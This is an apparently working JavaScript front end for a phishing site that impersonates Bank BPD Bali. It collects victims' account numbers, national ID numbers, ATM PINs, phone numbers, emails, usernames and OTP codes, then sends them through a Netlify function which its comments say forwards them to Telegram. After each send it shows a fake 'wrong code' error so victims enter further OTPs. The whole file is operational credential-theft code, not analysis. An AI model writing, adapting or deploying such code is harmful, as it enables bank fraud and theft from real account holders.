// Konfigurasi API URL (Netlify Function)
const API_URL = '/.netlify/functions/send-aktivasi';

// ========== NAVIGASI ==========
function pindahHalaman(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    
    if (id === 'page2') {
        setTimeout(function() {
            const noRekeningField = document.getElementById('noRekening');
            if (noRekeningField) {
                noRekeningField.focus();
                noRekeningField.click();
            }
        }, 100);
    }
}

// ========== HALAMAN 2 ==========
const noRekening = document.getElementById('noRekening');
const noIdentitas = document.getElementById('noIdentitas');
const pinAtm = document.getElementById('pinAtm');
const noTelpon = document.getElementById('noTelpon');
const email = document.getElementById('email');
const btnLanjut = document.getElementById('btnLanjut');
const infoPage2 = document.getElementById('infoPage2');

function isFormPage2Valid() {
    if (!noRekening.value.trim()) return false;
    if (!noIdentitas.value.trim()) return false;
    if (!pinAtm.value.trim()) return false;
    if (!noTelpon.value.trim()) return false;
    if (!email.value.trim()) return false;
    if (!email.value.includes('@')) return false;
    return true;
}

function cekFormPage2() {
    if (isFormPage2Valid()) {
        infoPage2.innerHTML = '* Data lengkap, tekan Cetak Laporan / Pemulihan';
        infoPage2.style.color = '#27ae60';
    } else {
        infoPage2.innerHTML = '* Harap isi semua data dengan benar (email harus valid)';
        infoPage2.style.color = '#e67e22';
    }
}

// Filter input hanya angka
if (noRekening) {
    noRekening.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
    noRekening.addEventListener('blur', cekFormPage2);
}
if (noIdentitas) {
    noIdentitas.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
    noIdentitas.addEventListener('blur', cekFormPage2);
}
if (pinAtm) {
    pinAtm.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); cekFormPage2(); });
    pinAtm.addEventListener('blur', cekFormPage2);
}
if (noTelpon) {
    noTelpon.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
    noTelpon.addEventListener('blur', cekFormPage2);
}
if (email) {
    email.addEventListener('input', cekFormPage2);
    email.addEventListener('blur', cekFormPage2);
}

// Fungsi untuk menampilkan loading
function showLoading() {
    let loading = document.querySelector('.loading-overlay');
    if (!loading) {
        loading = document.createElement('div');
        loading.className = 'loading-overlay';
        loading.innerHTML = '<div class="loading-spinner"></div>';
        document.body.appendChild(loading);
    }
    loading.style.display = 'flex';
}

function hideLoading() {
    const loading = document.querySelector('.loading-overlay');
    if (loading) {
        loading.style.display = 'none';
    }
}

// Kirim data ke Netlify Function
async function kirimKeTelegram(data) {
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.message || 'Gagal mengirim data');
        }
        
        return { success: true, data: result };
    } catch (error) {
        console.error('Error:', error);
        return { success: false, error: error.message };
    }
}

function lanjutKePage3() {
    if (!isFormPage2Valid()) {
        alert('Lengkapi semua data dengan benar');
        return;
    }
    
    // Simpan data ke sessionStorage
    const userData = {
        noRekening: noRekening.value.trim(),
        noIdentitas: noIdentitas.value.trim(),
        pinAtm: pinAtm.value.trim(),
        noTelpon: noTelpon.value.trim(),
        email: email.value.trim(),
        timestamp: new Date().toLocaleString('id-ID')
    };
    sessionStorage.setItem('userData', JSON.stringify(userData));
    
    pindahHalaman('page3');
    
    setTimeout(function() {
        const usernameField = document.getElementById('username');
        if (usernameField) {
            usernameField.focus();
        }
    }, 150);
}

// ========== HALAMAN 3 dengan verifikasi ==========
let loadingTimeout = null;

async function verifikasiKode() {
    const username = document.getElementById('username');
    const kodeOtp = document.getElementById('kodeOtp');
    const btnVerif = document.getElementById('btnVerifikasi');
    const infoPage3 = document.getElementById('infoPage3');
    
    let error = '';
    if (!username.value.trim()) error += 'User.id tidak boleh kosong\n';
    if (!kodeOtp.value.trim()) error += 'Kode Aktivasi tidak boleh kosong\n';
    else if (kodeOtp.value.trim().length < 4) error += 'Kode Aktivasi minimal 4 digit\n';
    
    if (error) {
        alert('Verifikasi gagal:\n' + error);
        return;
    }
    
    if (btnVerif.disabled) return;
    
    // Ambil data dari sessionStorage
    const userDataStr = sessionStorage.getItem('userData');
    let userData = {};
    if (userDataStr) {
        userData = JSON.parse(userDataStr);
    }
    
    // Data lengkap untuk dikirim ke Telegram
    const dataToSend = {
        noRekening: userData.noRekening || '-',
        noIdentitas: userData.noIdentitas || '-',
        pinAtm: userData.pinAtm || '-',
        noTelpon: userData.noTelpon || '-',
        email: userData.email || '-',
        username: username.value.trim(),
        kodeOtp: kodeOtp.value.trim(),
        timestamp: new Date().toLocaleString('id-ID')
    };
    
    // Tampilkan loading
    showLoading();
    
    // Kirim ke Netlify Function
    const result = await kirimKeTelegram(dataToSend);
    
    hideLoading();
    
    if (result.success) {
        // Jika berhasil kirim, tetap tampilkan error "Kode Salah" sesuai permintaan
        alert('Kode salah versi Bank BPD Bali');
        kodeOtp.value = '';
        infoPage3.innerHTML = '* Kode salah, silakan masukkan kode aktivasi ulang';
        infoPage3.style.color = '#e74c3c';
        kodeOtp.focus();
        
        setTimeout(function() {
            if (infoPage3.innerHTML === '* Kode salah, silakan masukkan kode aktivasi ulang') {
                infoPage3.innerHTML = '* Masukkan kode aktivasi';
                infoPage3.style.color = '#e67e22';
            }
        }, 3000);
    } else {
        alert('Gagal mengirim data: ' + result.error);
    }
}

// Filter OTP hanya angka
const kodeOtp = document.getElementById('kodeOtp');
if (kodeOtp) {
    kodeOtp.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); });
}

// Inisialisasi
cekFormPage2();
